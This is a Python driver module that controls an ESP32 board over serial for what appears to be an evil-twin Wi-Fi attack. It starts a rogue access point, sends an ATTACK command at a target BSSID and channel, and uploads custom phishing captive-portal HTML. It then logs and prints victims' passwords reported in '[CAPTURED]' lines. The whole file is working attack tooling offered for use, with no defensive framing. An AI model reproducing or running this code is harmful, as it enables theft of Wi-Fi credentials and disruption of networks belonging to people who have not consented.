# esp_driver.py
import serial
import time
import threading
from config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_RESET, BAUDRATE, ESP_HTML_LIMIT
from logger import logger

class ESP32Driver:
    def __init__(self, port, baudrate=BAUDRATE):
        self.port = port
        self.baudrate = baudrate
        self.ser = None
        self.is_connected = False
        self.captured_password = None
        self.stop_reading = False
        self.read_thread = None
        self._last_response = None
        self._response_event = threading.Event()

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()
        # Don't suppress exceptions
        return False

    def connect(self):
        try:
            self.ser = serial.Serial(self.port, self.baudrate, timeout=1)
            time.sleep(2) # Wait for board reset
            self.is_connected = True
            logger.info(f"ESP Connected on {self.port}")
            print(f"{C_GREEN}[+] ESP Connected on {self.port}{C_RESET}")
            
            # Start listener thread
            self.stop_reading = False
            self.read_thread = threading.Thread(target=self._read_loop, daemon=True)
            self.read_thread.start()
            return True
        except serial.SerialException as e:
            logger.error(f"Serial Connection Error on {self.port}: {e}")
            print(f"{C_RED}[!] Serial Connection Error: {e}{C_RESET}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error connecting to ESP32: {e}")
            return False

    def _read_loop(self):
        while not self.stop_reading:
            if self.is_connected:
                try:
                    if self.ser and self.ser.in_waiting > 0:
                        line = self.ser.readline().decode('utf-8', errors='ignore').strip()
                        if line:
                            self._process_line(line)
                    else:
                        time.sleep(0.01) # CPU yielding
                except (OSError, serial.SerialException) as e:
                    logger.warning(f"ESP Disconnected: {e}")
                    self.is_connected = False
                    print(f"\n{C_RED}[!] ESP Disconnected! Attempting to reconnect...{C_RESET}")
                    if self.ser:
                        try: self.ser.close()
                        except: pass
            else:
                # Reconnection attempt loop
                try:
                    # Check if port exists before trying to open (optional but good on Linux)
                    self.ser = serial.Serial(self.port, self.baudrate, timeout=1)
                    time.sleep(2) # Wait for boot
                    self.is_connected = True
                    logger.info("ESP Reconnected successfully")
                    print(f"{C_GREEN}[+] ESP Reconnected!{C_RESET}")
                except Exception:
                    time.sleep(2) # Wait before retry
        
        # Cleanup on exit
        if self.ser:
            try: self.ser.close()
            except: pass

    def _process_line(self, line):
        # Analyze ESP32 response
        try:
            if "[CAPTURED]" in line:
                # [CAPTURED] mypassword123
                parts = line.split(" ", 1)
                if len(parts) > 1:
                    self.captured_password = parts[1].strip()
                    logger.info(f"ESP32 Captured Password: {self.captured_password}")
                    print(f"\n{C_GREEN}[!] CAPTURED DATA: {self.captured_password}{C_RESET}")
            
            elif "[STATUS]" in line:
                print(f"\n{C_CYAN}[ESP Status]: {line}{C_RESET}")
            elif "[EVENT]" in line:
                print(f"\n{C_YELLOW}[ESP Event]: {line}{C_RESET}")
            elif "[ERROR]" in line:
                logger.warning(f"ESP Error: {line}")
                print(f"\n{C_RED}[ESP Error]: {line}{C_RESET}")
            elif "[SUCCESS]" in line:
                print(f"\n{C_GREEN}[ESP]: {line}{C_RESET}")
        except Exception as e:
            logger.debug(f"Error processing serial line: {e}")

    def send_command(self, cmd):
        if self.is_connected and self.ser:
            try:
                full_cmd = cmd + "\n"
                self.ser.write(full_cmd.encode())
                time.sleep(0.1)
            except Exception as e:
                logger.error(f"Failed to send command '{cmd}': {e}")
                self.is_connected = False

    def start_host(self, ssid, channel):
        print(f"[*] Sending HOST command: {ssid} (CH: {channel})")
        logger.info(f"ESP HOST command: {ssid} ch:{channel}")
        self.send_command(f"HOST {ssid} {channel}")

    def start_attack(self, bssid, channel, duration=0):
        self.send_command(f"ATTACK {bssid} {channel} {duration}")

    def send_ok(self):
        self.send_command("OK")

    def send_no(self):
        self.send_command("NO")

    def stop_all(self):
        self.send_command("STOP")

    def send_custom_portal(self, html_content):
        """Send custom HTML captive portal to ESP via SET_HTML protocol."""
        if not self.is_connected or not self.ser:
            print(f"{C_RED}[!] ESP not connected{C_RESET}")
            return False

        html_bytes = html_content.encode('utf-8')
        length = len(html_bytes)

        if length > ESP_HTML_LIMIT:
            print(f"{C_RED}[!] HTML too large ({length} bytes, max {ESP_HTML_LIMIT}){C_RESET}")
            return False

        print(f"{C_YELLOW}[*] Sending custom portal to ESP ({length} bytes)...{C_RESET}")

        # Pause background reader to avoid interference
        self.stop_reading = True
        time.sleep(0.2)

        try:
            # Flush any stale data
            self.ser.reset_input_buffer()

            # Send command
            cmd = f"SET_HTML {length}\n"
            self.ser.write(cmd.encode())

            # Wait for [READY] SEND_HTML
            ready_line = self._read_line(timeout=5)
            if not ready_line or "READY" not in ready_line:
                print(f"{C_RED}[!] ESP not ready: {ready_line}{C_RESET}")
                return False

            # Send raw HTML bytes (no newline terminator — ESP reads exactly length bytes)
            self.ser.write(html_bytes)

            # Wait for success
            result_line = self._read_line(timeout=10)
            if result_line and "HTML_SAVED" in result_line:
                print(f"{C_GREEN}[+] Custom portal uploaded successfully{C_RESET}")
                return True
            else:
                print(f"{C_RED}[!] Upload failed: {result_line}{C_RESET}")
                return False

        except Exception as e:
            logger.error(f"Custom portal upload error: {e}")
            print(f"{C_RED}[!] Upload error: {e}{C_RESET}")
            return False
        finally:
            # Resume background reader
            self.stop_reading = False

    def clear_custom_portal(self):
        """Clear custom HTML from ESP, reverting to default portal."""
        if not self.is_connected or not self.ser:
            print(f"{C_RED}[!] ESP not connected{C_RESET}")
            return False

        self.stop_reading = True
        time.sleep(0.2)

        try:
            self.ser.reset_input_buffer()
            self.ser.write(b"CLEAR_HTML\n")
            result_line = self._read_line(timeout=5)
            if result_line and "HTML_CLEARED" in result_line:
                print(f"{C_GREEN}[+] Custom portal cleared, using default{C_RESET}")
                return True
            else:
                print(f"{C_YELLOW}[*] Clear response: {result_line}{C_RESET}")
                return False
        except Exception as e:
            logger.error(f"Clear portal error: {e}")
            return False
        finally:
            self.stop_reading = False

    def _read_line(self, timeout=5):
        """Read a single line from serial with timeout."""
        if not self.ser:
            return None
        try:
            deadline = time.time() + timeout
            buf = b""
            while time.time() < deadline:
                if self.ser.in_waiting > 0:
                    ch = self.ser.read(1)
                    if ch == b'\n':
                        return buf.decode('utf-8', errors='ignore').strip()
                    buf += ch
                else:
                    time.sleep(0.01)
            return buf.decode('utf-8', errors='ignore').strip() if buf else None
        except Exception:
            return None
        
    def close(self):
        self.stop_reading = True
        self.stop_all()
        time.sleep(0.3)  # Allow ESP to process STOP before closing serial

        if self.ser:
            try:
                self.ser.close()
            except: pass
        
        self.is_connected = False